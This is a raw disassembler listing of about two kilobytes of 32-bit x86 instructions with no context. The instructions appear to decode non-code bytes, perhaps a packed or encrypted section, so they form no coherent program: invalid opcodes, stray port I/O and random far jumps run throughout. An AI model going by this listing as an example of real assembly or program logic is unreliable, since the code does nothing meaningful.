  41a5bd:	daa    
  41a5be:	mov    bl,0xc5
  41a5c0:	add    eax,0x86b26b25
  41a5c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5c6:	jle    0x41a577
  41a5c8:	mov    ecx,DWORD PTR [esi+ebx*4-0x74]
  41a5cc:	mov    ebx,0x8c535220
  41a5d1:	push   edi
  41a5d2:	add    bl,dh
  41a5d4:	(bad)  
  41a5d5:	push   ss
  41a5d6:	sub    bh,dl
  41a5d8:	fcom   DWORD PTR [ebp-0xc]
  41a5db:	lock scas eax,DWORD PTR es:[edi]
  41a5dd:	sbb    BYTE PTR [ecx+edi*2],0x54
  41a5e1:	xchg   ebx,eax
  41a5e2:	packuswb mm6,mm6
  41a5e5:	mov    bh,0x46
  41a5e7:	add    eax,DWORD PTR [ecx*2-0x304aaebf]
  41a5ee:	iret   
  41a5ef:	dec    edi
  41a5f0:	aam    0x8d
  41a5f2:	dec    ebx
  41a5f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5f4:	mov    eax,ds:0x9cfc80e6
  41a5f9:	jp     0x41a61d
  41a5fb:	rol    bh,cl
  41a5fd:	mov    eax,0x337d15d3
  41a602:	cli    
  41a603:	neg    DWORD PTR [ebp+0x53]
  41a606:	nop
  41a607:	sbb    al,0xf2
  41a609:	mov    ebx,0x7a14bd6a
  41a60e:	iret   
  41a60f:	dec    ebx
  41a610:	test   eax,0x979e6d09
  41a615:	xchg   esi,eax
  41a616:	xchg   ebp,eax
  41a617:	in     al,0x71
  41a619:	xchg   DWORD PTR [edi+0xd6098d3],ecx
  41a61f:	rcl    DWORD PTR [eax+0x22105e78],1
  41a625:	add    al,0x16
  41a627:	ror    DWORD PTR [ebp-0x377fc52a],1
  41a62d:	rep stos BYTE PTR es:[edi],al
  41a62f:	jmp    0xd27a664b
  41a634:	aas    
  41a635:	jmp    0x891f:0xefafec86
  41a63c:	mov    bl,0x1a
  41a63e:	sahf   
  41a63f:	div    BYTE PTR [esi+0x1b22b9e9]
  41a645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a646:	mov    eax,DWORD PTR [esi-0x5ca5153d]
  41a64c:	bound  ecx,QWORD PTR [eax]
  41a64e:	sbb    BYTE PTR [ecx+0x41],bl
  41a651:	pop    esp
  41a652:	inc    esp
  41a653:	popa   
  41a654:	sbb    edx,edx
  41a656:	pop    ss
  41a657:	mov    ebp,DWORD PTR [eax-0x33e9ad13]
  41a65d:	lods   al,BYTE PTR ds:[esi]
  41a65e:	dec    eax
  41a65f:	push   edx
  41a660:	mov    ah,0x59
  41a662:	pop    ecx
  41a663:	pop    ebx
  41a664:	or     DWORD PTR [esi],edi
  41a666:	dec    edi
  41a667:	jle    0x41a617
  41a669:	inc    esi
  41a66a:	adc    DWORD PTR [ecx+edi*8],0xa907857
  41a671:	xlat   BYTE PTR ds:[ebx]
  41a672:	mov    WORD PTR [edi-0x43d3fe1e],?
  41a678:	push   ds
  41a679:	jo     0x41a638
  41a67b:	mov    bl,0x1e
  41a67d:	ror    BYTE PTR [eax+0x3229738b],0x73
  41a684:	inc    esp
  41a685:	adc    bh,BYTE PTR [esi-0x45]
  41a688:	sub    DWORD PTR [esi-0x3e69e4a2],ebx
  41a68e:	add    DWORD PTR [esi],0x26e3f28d
  41a694:	inc    eax
  41a695:	pop    ds
  41a696:	sbb    BYTE PTR [esi+0x9631c06],ch
  41a69c:	ror    DWORD PTR [ecx-0x2e0c11c9],0xb1
  41a6a3:	and    DWORD PTR [ecx+0x32719e1],eax
  41a6a9:	pop    ecx
  41a6aa:	add    eax,0x3ff81313
  41a6af:	lahf   
  41a6b0:	in     eax,0xdb
  41a6b2:	and    BYTE PTR gs:[ebx],dl
  41a6b5:	pop    eax
  41a6b6:	aas    
  41a6b7:	push   ebp
  41a6b8:	das    
  41a6b9:	sub    ecx,DWORD PTR [ecx+0x2bf44393]
  41a6bf:	push   DWORD PTR [edi+ecx*1]
  41a6c2:	aaa    
  41a6c3:	scas   eax,DWORD PTR es:[edi]
  41a6c4:	ins    BYTE PTR es:[edi],dx
  41a6c5:	stos   BYTE PTR es:[edi],al
  41a6c6:	out    dx,al
  41a6c7:	int3   
  41a6c8:	push   edx
  41a6c9:	cmp    eax,edi
  41a6cb:	rcl    BYTE PTR es:[esi],0xd8
  41a6cf:	push   edi
  41a6d0:	jo     0x41a70f
  41a6d2:	sub    ebx,DWORD PTR [edi-0x52]
  41a6d5:	cmp    eax,0x674908d8
  41a6da:	pop    edi
  41a6db:	inc    ebp
  41a6dc:	mov    cl,0xde
  41a6de:	adc    ch,BYTE PTR [ebx]
  41a6e0:	sub    bh,BYTE PTR [ecx+0x6a]
  41a6e3:	and    BYTE PTR [edx-0x5f73eb11],cl
  41a6e9:	call   DWORD PTR [ebx-0x40346912]
  41a6ef:	jae    0x41a73f
  41a6f1:	addr16 ds (bad) 
  41a6f4:	cdq    
  41a6f5:	aaa    
  41a6f6:	int    0xbd
  41a6f8:	sbb    edx,DWORD PTR [ebx-0x29db50d0]
  41a6fe:	add    al,0x2b
  41a700:	aaa    
  41a701:	ret    
  41a702:	sbb    al,0x1d
  41a704:	jecxz  0x41a6b5
  41a706:	mov    eax,ds:0x4b2e82b7
  41a70b:	jne    0x41a69f
  41a70d:	call   0x245305c8
  41a712:	aas    
  41a713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a714:	shl    BYTE PTR [ecx-0x6],0x9a
  41a718:	fisttp WORD PTR [ebp-0x2e85c9cc]
  41a71e:	push   eax
  41a71f:	mov    al,ds:0xd3a39b40
  41a724:	imul   edx,DWORD PTR [bx+si-0x17b1],0xbdffa18
  41a72d:	out    dx,eax
  41a72e:	jbe    0x41a701
  41a730:	iret   
  41a731:	sti    
  41a732:	fld    TBYTE PTR [eax]
  41a734:	(bad)  
  41a736:	adc    al,BYTE PTR [ecx]
  41a738:	mov    al,ds:0x4723d7c2
  41a73d:	xor    BYTE PTR [edi],0x6e
  41a740:	sub    eax,0x5089246f
  41a745:	cli    
  41a746:	mov    edi,DWORD PTR [ebp-0xb5dfd69]
  41a74c:	add    ch,BYTE PTR [edi+eax*1+0x5a]
  41a750:	sub    esp,ecx
  41a752:	loopne 0x41a78c
  41a754:	pop    DWORD PTR [ecx+edi*4]
  41a757:	cld    
  41a758:	enter  0xc793,0xc9
  41a75c:	dec    ecx
  41a75d:	pop    ebp
  41a75e:	jp     0x41a7ab
  41a760:	push   edx
  41a761:	out    dx,eax
  41a762:	sbb    eax,0xc9b68d49
  41a767:	dec    ebx
  41a768:	pop    ebp
  41a769:	daa    
  41a76a:	jg     0x41a7c3
  41a76c:	clc    
  41a76d:	pop    es
  41a76e:	call   0x50b9:0x288c2644
  41a775:	fst    DWORD PTR [eax-0x532c29ba]
  41a77b:	add    dl,dh
  41a77d:	and    edx,esi
  41a77f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a780:	bswap  ebp
  41a782:	push   ebp
  41a783:	xchg   esp,eax
  41a784:	mov    dh,0xb2
  41a786:	jl     0x41a76d
  41a788:	mov    al,ah
  41a78a:	cwde   
  41a78b:	std    
  41a78c:	mov    ch,0xec
  41a78e:	xor    eax,DWORD PTR [esi+eax*4+0x3f97b6f6]
  41a795:	and    DWORD PTR [ebp+0x31],ebp
  41a798:	ds push edx
  41a79a:	xchg   edx,eax
  41a79b:	mov    dh,0x4e
  41a79d:	or     bl,BYTE PTR [edi-0x5f]
  41a7a0:	mov    ch,0x4e
  41a7a2:	push   0x8d4e0379
  41a7a7:	mov    esp,0x134b332c
  41a7ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7ad:	sbb    BYTE PTR [esi+0x43],bl
  41a7b0:	add    DWORD PTR [eax+0x73cac819],eax
  41a7b6:	cmp    eax,0x7a31da8f
  41a7bb:	mov    ds:0x287764eb,eax
  41a7c0:	(bad)  
  41a7c1:	shl    BYTE PTR [ebx-0x7db42e9f],1
  41a7c7:	sahf   
  41a7c8:	jnp    0x41a7b6
  41a7ca:	xor    ecx,DWORD PTR [ebx+0x58]
  41a7cd:	add    ecx,DWORD PTR [esi]
  41a7cf:	int3   
  41a7d0:	(bad)  
  41a7d1:	stc    
  41a7d2:	iret   
  41a7d3:	mov    ebp,0xa4852c22
  41a7d8:	dec    ebx
  41a7d9:	test   eax,0x74b4cf63
  41a7de:	jmp    0x41a779
  41a7e0:	cmp    BYTE PTR [eax],0x14
  41a7e3:	and    edi,edi
  41a7e5:	add    dl,BYTE PTR [edi+0x12]
  41a7e8:	test   eax,0x27d6ead6
  41a7ed:	sub    bh,BYTE PTR [edi-0x63]
  41a7f0:	mov    dl,0x50
  41a7f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7f3:	loope  0x41a787
  41a7f5:	les    edx,FWORD PTR [ecx]
  41a7f7:	pop    ebp
  41a7f8:	mov    esp,0x559a9a2
  41a7fd:	adc    ecx,DWORD PTR [edx+0x746eb79a]
  41a803:	daa    
  41a804:	inc    ecx
  41a805:	cmp    BYTE PTR [ebp+0x1950446d],dl
  41a80b:	inc    DWORD PTR ds:0x28213ca1
  41a811:	push   ds
  41a812:	push   eax
  41a813:	and    edi,esp
  41a815:	dec    ebp
  41a816:	rol    DWORD PTR [ebx-0x2c],1
  41a819:	push   0x1dc4e917
  41a81e:	in     eax,0x9d
  41a820:	into   
  41a821:	jl     0x41a825
  41a823:	and    eax,0xce4700e9
  41a828:	jmp    0x41a843
  41a82a:	int    0x7c
  41a82c:	fsubr  DWORD PTR [esi-0x80]
  41a82f:	jmp    0x3583:0x41635269
  41a836:	push   eax
  41a837:	stos   BYTE PTR es:[edi],al
  41a838:	adc    BYTE PTR [eax],bl
  41a83a:	inc    ecx
  41a83b:	jb     0x41a88d
  41a83d:	push   cs
  41a83e:	nop
  41a83f:	xor    al,0x0
  41a841:	xchg   ecx,eax
  41a842:	or     eax,0x53615df5
  41a847:	loopne 0x41a7e9
  41a849:	mov    ebp,0xf6d1fcd
  41a84e:	out    dx,al
  41a84f:	rol    DWORD PTR [ecx],0x3c
  41a852:	dec    ebp
  41a853:	in     eax,0xf9
  41a855:	mov    al,0xd4
  41a857:	lods   eax,DWORD PTR ds:[esi]
  41a858:	cmp    BYTE PTR [edx],dl
  41a85a:	or     DWORD PTR [edi-0x48],eax
  41a85d:	out    dx,eax
  41a85e:	jns    0x41a85b
  41a860:	adc    ch,BYTE PTR [ebp+0x2aafdced]
  41a866:	sub    cl,ch
  41a868:	out    dx,eax
  41a869:	sahf   
  41a86a:	dec    edx
  41a86b:	xchg   edx,eax
  41a86c:	mov    BYTE PTR [ecx+ebx*4+0x55f8e26c],ah
  41a873:	and    BYTE PTR [ebp-0x44],ch
  41a876:	retf   0xb369
  41a879:	enter  0x9550,0x37
  41a87d:	xchg   edi,eax
  41a87e:	push   edi
  41a87f:	xchg   eax,esp
  41a881:	in     eax,0x55
  41a883:	inc    esi
  41a884:	push   ebp
  41a885:	retf   
  41a886:	push   0xfffffff0
  41a888:	leave  
  41a889:	cmp    BYTE PTR [edi-0x44],bh
  41a88c:	add    esi,DWORD PTR [edi+0x2b]
  41a88f:	cwde   
  41a890:	add    BYTE PTR [eax],ah
  41a892:	cdq    
  41a893:	sub    DWORD PTR [eax+esi*1],0x13
  41a897:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a898:	out    0xfc,al
  41a89a:	xor    bh,BYTE PTR [ecx-0x29]
  41a89d:	cmc    
  41a89e:	in     eax,0x84
  41a8a0:	sub    al,0xb8
  41a8a2:	pop    edx
  41a8a3:	sub    edx,0x2409b81f
  41a8a9:	xor    al,0xaa
  41a8ab:	pop    ds
  41a8ac:	and    eax,0x6f1b0274
  41a8b1:	jno    0x41a8d9
  41a8b3:	enter  0xd880,0x4c
  41a8b7:	sub    ch,dh
  41a8b9:	fcom   DWORD PTR [ebx+0x16]
  41a8bc:	pop    edi
  41a8bd:	loope  0x41a918
  41a8bf:	jge    0x41a907
  41a8c1:	xchg   DWORD PTR [eax-0x45],ecx
  41a8c4:	test   eax,0x15c9ba8b
  41a8c9:	pop    eax
  41a8ca:	add    eax,0xbfbe2a76
  41a8cf:	mov    eax,ds:0x95f7313c
  41a8d4:	(bad)  
  41a8d5:	cld    
  41a8d6:	ds dec edx
  41a8d8:	scas   al,BYTE PTR es:[edi]
  41a8d9:	aad    0xcd
  41a8db:	js     0x41a95c
  41a8dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8de:	jl     0x41a88b
  41a8e0:	mov    ah,0x8d
  41a8e2:	xor    BYTE PTR [edi+0x66],bl
  41a8e5:	fldcw  WORD PTR [ebx+0x24a51108]
  41a8eb:	leave  
  41a8ec:	ret    0x5568
  41a8ef:	or     eax,0x699cd9bb
  41a8f4:	fild   DWORD PTR [ecx+ebp*4]
  41a8f7:	outs   dx,BYTE PTR ds:[esi]
  41a8f8:	scas   al,BYTE PTR es:[edi]
  41a8f9:	jmp    0xa24ee50e
  41a8fe:	push   edi
  41a8ff:	inc    eax
  41a900:	mov    edi,0xedf7c67c
  41a905:	retf   0x6611
  41a908:	ins    BYTE PTR es:[edi],dx
  41a909:	aad    0x94
  41a90b:	mov    al,0xaf
  41a90d:	sbb    ebx,ebp
  41a90f:	les    ebx,FWORD PTR [ebx+eiz*2-0x51]
  41a913:	div    DWORD PTR [ebp+eax*1-0x48]
  41a917:	pop    esp
  41a918:	inc    ebp
  41a919:	cli    
  41a91a:	(bad)  
  41a91b:	call   0x3dbca3d0
  41a920:	(bad)  [eax+0x51]
  41a923:	in     al,dx
  41a924:	jno    0x41a8e7
  41a926:	mov    esi,0xfc4bb3a2
  41a92b:	idiv   BYTE PTR ds:0xbc1496fc
  41a931:	adc    DWORD PTR [edi],0x3d
  41a934:	mov    cl,0xcc
  41a936:	leave  
  41a937:	mov    fs,WORD PTR [eax]
  41a939:	mov    WORD PTR [ebp+eax*4-0x501e2792],ss
  41a940:	pop    eax
  41a941:	sbb    eax,0xea835158
  41a946:	push   ebp
  41a947:	pop    ss
  41a948:	ds or  eax,0x32b92528
  41a94e:	adc    bh,0xe7
  41a951:	mov    ecx,0x2b30b906
  41a956:	pop    esp
  41a957:	je     0x41a9d4
  41a959:	(bad)  
  41a95a:	xor    eax,DWORD PTR [edx-0x38]
  41a95d:	adc    al,0x4b
  41a95f:	xor    al,0xef
  41a961:	adc    BYTE PTR [ecx-0x34429d82],dh
  41a967:	fsubr  DWORD PTR [esi]
  41a969:	mov    DWORD PTR [eax+0x25],0xf326da6d
  41a970:	in     al,dx
  41a971:	cli    
  41a972:	icebp  
  41a973:	and    eax,0x505b7350
  41a978:	xor    edi,DWORD PTR [esi-0x4ff1ba88]
  41a97e:	pop    ecx
  41a97f:	mov    cl,0x69
  41a981:	adc    eax,DWORD PTR [edx]
  41a983:	adc    BYTE PTR [ebp-0xb40c8cb],dh
  41a989:	mov    eax,0x9d039046
  41a98e:	enter  0x2681,0x51
  41a992:	dec    esi
  41a993:	or     DWORD PTR [edi],ebx
  41a995:	push   edi
  41a996:	cmp    ecx,esp
  41a998:	adc    DWORD PTR [edi+edi*2-0x35],ebx
  41a99c:	retf   0xd08e
  41a99f:	cwde   
  41a9a0:	adc    BYTE PTR [ebp+0x602ef7aa],dh
  41a9a6:	push   0xebf44533
  41a9ab:	fbld   TBYTE PTR [ebp+edi*2+0x7717a1]
  41a9b2:	push   ds
  41a9b3:	ins    BYTE PTR es:[edi],dx
  41a9b4:	xchg   ebp,eax
  41a9b5:	ret    0x85b0
  41a9b8:	int    0x71
  41a9ba:	add    eax,0xa0744285
  41a9bf:	mov    al,ds:0xa005894f
  41a9c4:	xor    esi,DWORD PTR [eax+edx*1]
  41a9c7:	lahf   
  41a9c8:	cs cdq 
  41a9ca:	sub    DWORD PTR [edi-0x15],eax
  41a9cd:	push   edi
  41a9ce:	add    bl,0x13
  41a9d1:	in     eax,0xc8
  41a9d3:	fsub   QWORD PTR [ebx-0x67508b18]
  41a9d9:	dec    ecx
  41a9da:	popf   
  41a9db:	dec    edx
  41a9dc:	mov    bl,0xfd
  41a9de:	ret    
  41a9df:	dec    esp
  41a9e0:	(bad)  
  41a9e1:	das    
  41a9e2:	push   cs
  41a9e3:	xor    edx,DWORD PTR [esi-0x59]
  41a9e6:	push   0x3f3d1dfe
  41a9eb:	dec    ecx
  41a9ec:	xor    al,0xf
  41a9ee:	cmp    eax,0xd46c8c9b
  41a9f3:	lock jge 0x41aa11
  41a9f6:	std    
  41a9f7:	jge    0x41aa3b
  41a9f9:	lods   al,BYTE PTR ds:[esi]
  41a9fa:	mov    WORD PTR [esi+0x56],ds
  41a9fd:	out    dx,al
  41a9fe:	shl    BYTE PTR [esi+0x41be04c4],0x24
  41aa05:	sub    esi,DWORD PTR [edx]
  41aa07:	leave  
  41aa08:	and    eax,0x141c718c
  41aa0d:	(bad)  
  41aa0e:	push   esi
  41aa0f:	les    esp,FWORD PTR [ebp+0x9]
  41aa12:	popf   
  41aa13:	(bad)  
  41aa14:	xchg   ecx,eax
  41aa15:	cmp    DWORD PTR [esi+0x46],ebx
  41aa18:	mov    dh,0xe3
  41aa1a:	(bad)  
  41aa1b:	and    bh,BYTE PTR [ebx-0x41a9351c]
  41aa21:	dec    edi
  41aa22:	out    0x81,al
  41aa24:	ror    DWORD PTR [edx-0x1e8c7c19],1
  41aa2a:	and    BYTE PTR [eax],ah
  41aa2c:	mov    DWORD PTR [edx+0xf],ebp
  41aa2f:	div    ebp
  41aa31:	dec    esp
  41aa33:	dec    esp
  41aa34:	ins    DWORD PTR es:[edi],dx
  41aa35:	inc    edx
  41aa36:	imul   eax,DWORD PTR [eax-0x391a3864],0x8e2d9028
  41aa40:	test   eax,0xf10a98f2
  41aa45:	fwait
  41aa46:	clc    
  41aa47:	xchg   ebp,eax
  41aa48:	idiv   BYTE PTR [ebx]
  41aa4a:	xor    BYTE PTR [ebp+0x3338b915],dh
  41aa50:	das    
  41aa51:	push   ebx
  41aa52:	das    
  41aa53:	sub    eax,0xbf26711f
  41aa58:	fadd   DWORD PTR [esi]
  41aa5a:	mov    edi,0x671a1203
  41aa5f:	push   esp
  41aa60:	test   ebx,eax
  41aa62:	xor    edx,DWORD PTR [esi]
  41aa64:	enter  0x3dd3,0x2
  41aa68:	loop   0x41aa8c
  41aa6a:	lods   al,BYTE PTR ds:[esi]
  41aa6b:	jo     0x41aa77
  41aa6d:	mov    cl,0x6f
  41aa6f:	out    0xfb,al
  41aa71:	jge    0x41aa6e
  41aa73:	pop    ebp
  41aa74:	repnz sub DWORD PTR [edi],edx
  41aa77:	es or  edi,esi
  41aa7a:	dec    ebx
  41aa7b:	mov    ah,0xd4
  41aa7d:	out    dx,eax
  41aa7e:	xor    al,0x4d
  41aa80:	cmp    eax,0xbdbad585
  41aa85:	xor    dh,0xa1
  41aa88:	dec    edi
  41aa89:	cmp    ecx,DWORD PTR [edi+0x5873410d]
  41aa8f:	fdivr  QWORD PTR [ebx-0x51]
  41aa92:	test   DWORD PTR [ecx-0x44a47ac7],0xaaa547a4
  41aa9c:	sub    DWORD PTR gs:[edi+edx*1+0x27],esp
  41aaa1:	iret   
  41aaa2:	add    BYTE PTR gs:[edx+esi*4],cl
  41aaa6:	adc    bh,BYTE PTR [esi]
  41aaa8:	pop    ecx
  41aaa9:	push   esi
  41aaaa:	inc    esp
  41aaab:	test   BYTE PTR [esi+0x1f],ah
  41aaae:	sub    ebx,DWORD PTR [ebx]
  41aab0:	aas    
  41aab1:	mov    ebx,0x1519f92d
  41aab6:	dec    ecx
  41aab7:	xchg   esp,eax
  41aab8:	aaa    
  41aab9:	loop   0x41aaea
  41aabb:	cmp    eax,0x10b5a0c4
  41aac0:	pop    ds
  41aac1:	stos   BYTE PTR es:[edi],al
  41aac2:	jno    0x41aae8
  41aac4:	fs push esi
  41aac6:	imul   ebp,DWORD PTR [eax],0x7
  41aac9:	test   DWORD PTR [edx+0x1],edi
  41aacc:	mov    BYTE PTR [edi+0x372ac472],al
  41aad2:	shl    DWORD PTR ds:0xe7f9ef3f,0x46
  41aad9:	adc    edi,ebp
  41aadb:	loopne 0x41aac8
  41aadd:	push   ecx
  41aade:	mov    ds:0xb11689b7,al
  41aae3:	mov    dl,0xe1
  41aae5:	popf   
  41aae6:	push   edx
  41aae7:	xor    esp,esi
  41aae9:	sub    BYTE PTR ds:0x6c73876d,0x9f
  41aaf0:	pop    eax
  41aaf1:	ror    BYTE PTR [ebp-0x12862666],cl
  41aaf7:	pop    es
  41aaf8:	push   ecx
  41aaf9:	ror    ch,cl
  41aafb:	pop    ebp
  41aafc:	jae    0x41aa8b
  41aafe:	jnp    0x41aac2
  41ab00:	ss push edx
  41ab02:	out    dx,eax
  41ab03:	or     al,BYTE PTR [ecx+0x62]
  41ab06:	jns    0x41ab47
  41ab08:	(bad)  
  41ab09:	or     DWORD PTR ds:[edx-0x1b],edi
  41ab0d:	pop    edx
  41ab0e:	icebp  
  41ab0f:	leave  
  41ab10:	rol    BYTE PTR es:[edx+0x30d6c34],0x6f
  41ab18:	jb     0x41aae9
  41ab1a:	int    0x6a
  41ab1c:	mov    dl,0x31
  41ab1e:	ret    0xf6f7
  41ab21:	outs   dx,BYTE PTR gs:[esi]
  41ab23:	and    dl,BYTE PTR [eax]
  41ab25:	stos   BYTE PTR es:[edi],al
  41ab26:	cmp    edi,DWORD PTR [edi-0x3]
  41ab29:	cmp    eax,0xa48f65f4
  41ab2e:	mov    al,ds:0x66031036
  41ab33:	push   ebx
  41ab34:	test   eax,0xed21f287
  41ab39:	lahf   
  41ab3a:	mov    eax,ds:0x3b1691e4
  41ab3f:	dec    edi
  41ab40:	shl    BYTE PTR [eax],cl
  41ab42:	jae    0x41ab39
  41ab44:	ret    0x1493
  41ab47:	retf   
  41ab48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab49:	lds    esp,FWORD PTR [edi+0x5a]
  41ab4c:	sub    DWORD PTR [ebp+0x6f],esi
  41ab4f:	daa    
  41ab50:	jle    0x41abb2
  41ab52:	xor    DWORD PTR [ebx+edi*2+0x1d],ebx
  41ab56:	data16 aam 0xdf
  41ab59:	sahf   
  41ab5a:	jnp    0x41ab07
  41ab5c:	mov    al,ds:0x984de29c
  41ab61:	dec    eax
  41ab62:	out    dx,eax
  41ab63:	xchg   ecx,eax
  41ab64:	pop    esi
  41ab65:	dec    edi
  41ab66:	outs   dx,DWORD PTR ds:[esi]
  41ab67:	mov    esp,0x357c9bb1
  41ab6c:	test   eax,0x696e3aa
  41ab71:	jp     0x41ab61
  41ab73:	outs   dx,BYTE PTR ds:[esi]
  41ab74:	pop    ebx
  41ab75:	cmc    
  41ab76:	sbb    BYTE PTR [ecx+0x2b19757a],0x95
  41ab7d:	mov    edi,0x968d72b9
  41ab82:	mov    ebp,ds
  41ab84:	fs cmp eax,0x12bc07ac
  41ab8a:	in     al,0x75
  41ab8c:	fmul   st(1),st
  41ab8e:	mov    cl,0xb9
  41ab90:	push   esi
  41ab91:	dec    edx
  41ab92:	(bad)  
  41ab93:	and    al,0xfa
  41ab95:	int3   
  41ab96:	pop    ebx
  41ab97:	idiv   esi
  41ab99:	xchg   edx,eax
  41ab9a:	xchg   esi,eax
  41ab9b:	pop    ecx
  41ab9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab9d:	mov    dh,0xce
  41ab9f:	or     ebx,esi
  41aba1:	mov    cl,0xf3
  41aba3:	jle    0x41ab86
  41aba5:	test   BYTE PTR [esi+0x6d],al
  41aba8:	jae    0x41ab80
  41abaa:	(bad)  
  41abab:	push   ds
  41abac:	inc    esp
  41abad:	mov    ebx,0x4c308cfe
  41abb2:	sub    bh,bh
  41abb4:	or     dh,BYTE PTR [edi-0x56]
  41abb7:	fwait
  41abb8:	mov    esp,0xb2632a54
  41abbd:	pop    ss
  41abbe:	mov    edx,eax
  41abc0:	adc    DWORD PTR [edx],ecx
  41abc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abc3:	push   0xe9f1daa2
  41abc8:	fs push 0xc5717cac
  41abce:	inc    edi
  41abcf:	icebp  
  41abd0:	jmp    0xcdd8a6fd
  41abd5:	pop    edx
  41abd6:	test   DWORD PTR [eax-0x1d],esi
  41abd9:	in     eax,0x4a
  41abdb:	test   DWORD PTR [esi-0x2ad3bd86],esp
  41abe1:	outs   dx,BYTE PTR ds:[esi]
  41abe2:	sub    ch,BYTE PTR ds:0xd7f67ad7
  41abe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abe9:	or     DWORD PTR [esp+eiz*8-0x75],eax
  41abed:	sub    al,0xea
  41abef:	lea    esi,[eax-0x58]
  41abf2:	lods   al,BYTE PTR ds:[esi]
  41abf3:	push   0xfffffffa
  41abf5:	dec    eax
  41abf6:	or     al,0xbe
  41abf8:	repz ror BYTE PTR [edi],1
  41abfb:	cdq    
  41abfc:	into   
  41abfd:	sahf   
  41abfe:	cmp    esi,DWORD PTR [ecx]
  41ac00:	jmp    DWORD PTR [edx+0x324182fd]
  41ac06:	xchg   esi,eax
  41ac07:	or     DWORD PTR ss:[edi+eiz*2-0x76],ebp
  41ac0c:	cdq    
  41ac0d:	mov    esp,0x69231a9
  41ac12:	loopne 0x41abf1
  41ac14:	lea    eax,[bp+si]
  41ac17:	add    al,0xfb
  41ac19:	cld    
  41ac1a:	adc    bl,0xde
  41ac1d:	and    DWORD PTR [edi+0x15de774c],0xb9b42601
  41ac27:	push   esi
  41ac28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac29:	retf   
  41ac2a:	pop    ebp
  41ac2b:	aas    
  41ac2c:	pop    ebp
  41ac2d:	sbb    BYTE PTR [eax+0x6e],bl
  41ac30:	pop    es
  41ac31:	xor    al,0x6b
  41ac33:	jbe    0x41ac1b
  41ac35:	adc    al,0x5
  41ac37:	mov    bh,0x61
  41ac39:	pop    esp
  41ac3a:	push   ebx
  41ac3b:	lahf   
  41ac3c:	es xchg esi,eax
  41ac3e:	lods   eax,DWORD PTR ds:[esi]
  41ac3f:	ret    0x5e09
  41ac42:	xor    BYTE PTR [esi+0x20],0xb9
  41ac46:	repnz cmp DWORD PTR [ebx+0x2bf0e90f],esp
  41ac4d:	xor    DWORD PTR [eax-0x1afb2c18],edi
  41ac53:	dec    eax
  41ac54:	push   edi
  41ac55:	push   ds
  41ac56:	ror    BYTE PTR [edi+0x7fbf2df9],0x8b
  41ac5d:	cmp    bl,BYTE PTR [ebx-0x2e]
  41ac60:	push   edi
  41ac61:	ret    
  41ac62:	push   esp
  41ac63:	push   edi
  41ac64:	test   BYTE PTR [edi],bl
  41ac66:	retf   0x90a8
  41ac69:	or     ebx,DWORD PTR [edi+eax*4-0x75a9c05e]
  41ac70:	push   ds
  41ac71:	pop    esp
  41ac72:	shl    DWORD PTR [ecx+0x46],cl
  41ac75:	sub    DWORD PTR [ebp+0x1],edi
  41ac78:	or     BYTE PTR [edi],bh
  41ac7a:	xor    ebx,DWORD PTR [ecx+0x29]
  41ac7d:	pop    esp
  41ac7e:	push   eax
  41ac7f:	mov    eax,0x5fb5927d
  41ac84:	icebp  
  41ac85:	lds    ebx,FWORD PTR [edi+0xe]
  41ac88:	and    BYTE PTR [ebx-0x1f8ff8cb],0xfc
  41ac8f:	loopne 0x41ac91
  41ac91:	enter  0x2aff,0x29
  41ac95:	jns    0x41acd6
  41ac97:	fild   DWORD PTR [eax+ebx*4]
  41ac9a:	imul   edi,esp,0x28
  41ac9d:	cdq    
  41ac9e:	adc    esp,edx
  41aca0:	fcmovb st,st(0)
  41aca2:	sub    al,0xf7
  41aca4:	cmp    cl,BYTE PTR [edx-0x4e1bcb72]
  41acaa:	ins    BYTE PTR es:[edi],dx
  41acab:	scas   al,BYTE PTR es:[edi]
  41acac:	std    
  41acad:	cmp    ah,BYTE PTR [eax-0x5793d0be]
  41acb3:	inc    ebp
  41acb4:	in     eax,0xb9
  41acb6:	out    dx,eax
  41acb7:	mov    ebx,0x40943b53
  41acbc:	cdq    
  41acbd:	mov    eax,ds:0x56fe95eb
  41acc2:	cli    
  41acc3:	jno    0x41acea
  41acc5:	mov    ch,0x8d
  41acc7:	test   eax,0x64477025
  41accc:	mov    ebp,DWORD PTR [eax-0x37ee6132]
  41acd2:	call   0x84a3:0xb24472eb
  41acd9:	cmp    BYTE PTR [ebp-0x43],dh
  41acdc:	xor    WORD PTR ds:[edi+ecx*1+0x7d6ab082],bp
  41ace5:	mov    bl,BYTE PTR [esi-0x50befe57]
  41aceb:	outs   dx,DWORD PTR ds:[esi]
  41acec:	arpl   WORD PTR [edx-0x32],bp
  41acef:	leave  
  41acf0:	and    eax,0xbfd1acdb
  41acf5:	je     0x41acad
  41acf7:	push   cs
  41acf8:	in     eax,0xd
  41acfa:	icebp  
  41acfb:	adc    edx,DWORD PTR [ebx-0x2e]
  41acfe:	fdivr  st(1),st
  41ad00:	in     al,0xdc
  41ad02:	jmp    0x41ad48
  41ad04:	cld    
  41ad05:	sub    al,0x66
  41ad07:	mov    esi,0x7ec29513
  41ad0c:	mov    bl,dl
  41ad0e:	mov    WORD PTR [ebp+0x3f],ds
  41ad11:	add    bl,BYTE PTR [eax-0x71]
  41ad14:	mov    dl,BYTE PTR [eax]
  41ad16:	jle    0x41ad54
  41ad18:	scas   al,BYTE PTR es:[edi]
  41ad19:	sar    ecx,1
  41ad1b:	dec    eax
  41ad1c:	outs   dx,DWORD PTR ds:[esi]
  41ad1d:	pop    ebx
  41ad1e:	cmp    DWORD PTR [eax],esp
  41ad20:	jle    0x41acd6
  41ad22:	xchg   edi,eax
  41ad23:	xor    al,0xcb
